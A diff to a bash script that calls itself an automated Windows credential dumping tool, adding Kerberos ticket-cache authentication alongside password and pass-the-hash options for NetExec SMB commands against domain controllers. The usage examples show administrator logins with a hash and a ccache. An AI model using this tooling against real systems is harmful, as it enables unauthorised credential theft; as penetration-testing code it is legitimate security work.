@@ -19,6 +19,40 @@ ensure_dir_exists() {
   fi
 }
 
+# Function to extract DC name from Kerberos ticket
+get_dc_name_from_kerberos_ticket() {
+  local ccache_file="${KRB5CCNAME:-/tmp/krb5cc_$(id -u)}"  # Use KRB5CCNAME if set, otherwise default location
+  if [[ ! -f "$ccache_file" ]]; then
+    echo -e "${RED}[ERROR]${RESET} Kerberos ticket cache file not found at $ccache_file."
+    exit 1
+  fi
+
+  # Extract DC name from the ticket
+  local dc_name
+  dc_name=$(klist -c "$ccache_file" | awk '/Service principal/ {getline; print $NF}' | sed 's|^cifs/||; s|@.*$||')
+
+  if [[ -z "$dc_name" ]]; then
+    echo -e "${RED}[ERROR]${RESET} Failed to extract the DC name from Kerberos ticket."
+    exit 1
+  fi
+
+  echo "$dc_name"
+}
+
+# Function to validate if the DC name matches the target
+validate_kerberos_target() {
+  local target="$1"
+  local dc_name
+  dc_name=$(get_dc_name_from_kerberos_ticket)
+
+  if [[ "$target" != "$dc_name" ]]; then
+    echo -e "${RED}[ERROR]${RESET} Target DC name ($target) does not match the Kerberos ticket's DC name ($dc_name)."
+    exit 1
+  else
+    [[ $VERBOSE -eq 1 ]] && echo -e "${GREEN}[INFO]${RESET} Target DC name matches the Kerberos ticket's DC name: $dc_name"
+  fi
+}
+
 # Ensure all necessary directories exist
 ensure_dir_exists "$BASE_DIR"
 ensure_dir_exists "$LOG_DIR"
@@ -53,16 +87,24 @@ trap "rm -f tmp.$$.json" EXIT
 usage() {
   echo "MagicDump - Automated Windows Credential Dumping Tool"
   echo ""
-  echo "Usage: $0 -t <target_ip> -u <username> [-p <password> | -H <hash>] [--local-auth] [-v|--verbose]"
+  echo "Usage: $0 -t <target_ip> -u <username> [-p <password> | -H <hash> | -k [--no-pass]] [--local-auth] [-v|--verbose]"
   echo ""
   echo "Options:"
-  echo "  -t, --target     Target IP address of the Windows machine"
-  echo "  -u, --username   Username for authentication"
-  echo "  -p, --password   Password for authentication"
-  echo "  -H, --hash       NTLM hash for Pass-the-Hash authentication"
-  echo "      --local-auth Use local authentication"
-  echo "  -v, --verbose    Enable verbose output for debugging"
-  echo "  -h, --help       Show this help message and exit"
+  echo "  -t, --target       Target IP address of the Windows machine"
+  echo "  -u, --username     Username for authentication"
+  echo "  -p, --password     Password for authentication"
+  echo "  -H, --hash         NTLM hash for Pass-the-Hash authentication"
+  echo "  -k, --kerberos     Use Kerberos authentication (requires a valid Kerberos ticket in KRB5CCNAME env)"
+  echo "      --no-pass      Skip password/hash when using Kerberos authentication"
+  echo "      --local-auth   Use local authentication"
+  echo "  -v, --verbose      Enable verbose output for debugging"
+  echo "  -h, --help         Show this help message and exit"
+  echo ""
+  echo "Examples:"
+  echo "  $0 -t dc.company.com -u administrator -p 'StrongPassword123'"
+  echo "  $0 -t dc.company.com -u administrator -H 'a066fbf49e79f43fffc449810227e399'"
+  echo "  $0 -t dc.company.com -u administrator -p 'StrongPassword123' -k"
+  echo "  KRB5CCNAME=administrator@cifs_dc.company.com@COMPANY.COM.ccache $0 -t dc.company.com -u administrator -k --no-pass"
   echo ""
   exit 0
 }
@@ -72,8 +114,10 @@ TARGET_HOST=""
 USERNAME=""
 PASSWORD=""
 HASH=""
+KRB_AUTH=0   # Default: Kerberos authentication disabled
+NO_PASS=0    # Default: Password or hash is required
 VERBOSE=0
-LOCAL_AUTH=0  # Default: Do not use local authentication
+LOCAL_AUTH=0
 
 while [[ $# -gt 0 ]]; do
   case "$1" in
@@ -93,6 +137,14 @@ while [[ $# -gt 0 ]]; do
       HASH="$2"
       shift 2
       ;;
+    -k|--kerberos)
+      KRB_AUTH=1
+      shift
+      ;;
+    --no-pass)
+      NO_PASS=1
+      shift
+      ;;
     --local-auth)
       LOCAL_AUTH=1
       shift
@@ -111,15 +163,37 @@ while [[ $# -gt 0 ]]; do
   esac
 done
 
-# Check for required arguments
-if [[ -z "$TARGET_HOST" || -z "$USERNAME" || ( -z "$PASSWORD" && -z "$HASH" ) ]]; then
+# Validation logic for arguments
+if [[ -z "$TARGET_HOST" || -z "$USERNAME" ]]; then
   echo -e "${RED}[ERROR]${RESET} Missing required arguments!"
   usage
+fi
+
+if [[ $NO_PASS -eq 1 ]]; then
+  if [[ $KRB_AUTH -ne 1 ]]; then
+    echo -e "${RED}[ERROR]${RESET} --no-pass requires Kerberos authentication (-k)."
+    usage
+  fi
+
+  if [[ -n "$PASSWORD" || -n "$HASH" ]]; then
+    echo -e "${RED}[ERROR]${RESET} --no-pass cannot be used with a password (-p) or hash (-H)."
+    usage
+  fi
 fi
 
 if [[ -n "$PASSWORD" && -n "$HASH" ]]; then
   echo -e "${RED}[ERROR]${RESET} Specify either a password (-p) or a hash (-H), but not both!"
   usage
+fi
+
+if [[ $KRB_AUTH -eq 1 ]]; then
+  add_log "Using Kerberos authentication."
+  validate_kerberos_target "$TARGET_HOST"
+else
+  if [[ -z "$PASSWORD" && -z "$HASH" ]]; then
+    echo -e "${RED}[ERROR]${RESET} Either a password (-p) or a hash (-H) must be provided if not using Kerberos authentication (-k)."
+    usage
+  fi
 fi
 
 # Verbose mode
@@ -179,12 +253,29 @@ run_command() {
 # Function to construct the base command
 construct_base_cmd() {
   local base_cmd="nxc smb $TARGET_HOST -u $USERNAME"
-  if [[ -n "$PASSWORD" ]]; then
-    base_cmd+=" -p '$PASSWORD'"
-  elif [[ -n "$HASH" ]]; then
-    base_cmd+=" -H '$HASH'"
+
+  if [[ $KRB_AUTH -eq 1 && $NO_PASS -eq 1 && -z "$KRB5CCNAME" ]]; then
+    echo -e "${RED}[ERROR]${RESET} KRB5CCNAME must be set when using Kerberos ticket cache (--no-pass)."
+    exit 1
   fi
+
+  if [[ $KRB_AUTH -eq 1 ]]; then
+    if [[ $NO_PASS -eq 1 ]]; then
+      base_cmd="KRB5CCNAME='$KRB5CCNAME' $base_cmd --use-kcache"  # Use Kerberos ticket cache
+    else
+      base_cmd+=" -k"  # Use Kerberos with password
+    fi
+  else
+    if [[ -n "$PASSWORD" ]]; then
+      base_cmd+=" -p '$PASSWORD'"
+    elif [[ -n "$HASH" ]]; then
+      base_cmd+=" -H '$HASH'"
+    fi
+  fi
+
   [[ $LOCAL_AUTH -eq 1 ]] && base_cmd+=" --local-auth"
+
+  [[ $VERBOSE -eq 1 ]] && echo -e "${BLUE}[DEBUG]${RESET} Constructed base command: $base_cmd"
   echo "$base_cmd"
 }
 
